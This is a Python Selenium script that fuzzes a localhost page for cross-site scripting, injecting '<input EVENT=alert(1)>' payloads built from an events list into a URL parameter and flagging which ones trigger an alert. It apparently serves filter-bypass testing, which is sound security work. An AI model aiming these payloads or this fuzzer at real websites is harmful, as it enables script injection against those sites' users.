from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, InvalidSessionIdException, NoSuchElementException
from termcolor import colored

def load_events(file='events.txt'):
    with open('events.txt', 'r') as infile:
        payloads = infile.read().split('\n')
    return payloads

def create_driver():
  chrome_options = webdriver.ChromeOptions()
  chrome_options.add_argument('--no-sandbox')
  chrome_options.add_argument('--headless') 
  chrome_options.add_argument('--disable-gpu')
  driver = webdriver.Chrome(options=chrome_options)
  return driver

def is_alert_present(driver, payload):
    url = f'http://localhost/?name={payload}'
    try:
        driver.get(url) 
    except (InvalidSessionIdException, UnboundLocalError):
        driver = create_driver()
        driver.get(url)

    try:
        action = ActionChains(driver)
        img = driver.find_element_by_tag_name("input")
        action.move_to_element(img).click().perform()

        WebDriverWait(driver, 0.5).until(expected_conditions.alert_is_present())
        alert = driver.switch_to.alert.accept()
        # xss successful
        return True
    except TimeoutException:
        # xss failed - page rendered but no alert
        return False
    except NoSuchElementException:
        # xss failed - there's no input tag
        return False
    finally:
        driver.close()


if __name__ == '__main__':
    driver = create_driver()
    events = load_events()
    try:
        for event in events:
            payload = f'<input {event}=alert(1)>'
            # style=top:0;left:0;position:absolute;width:100%;height:100%
            alert = is_alert_present(driver, payload)
            print(payload, colored('VULNERABLE', 'red') if alert else colored('NOT VULNERABLE', 'green'))
    finally:
        driver.quit()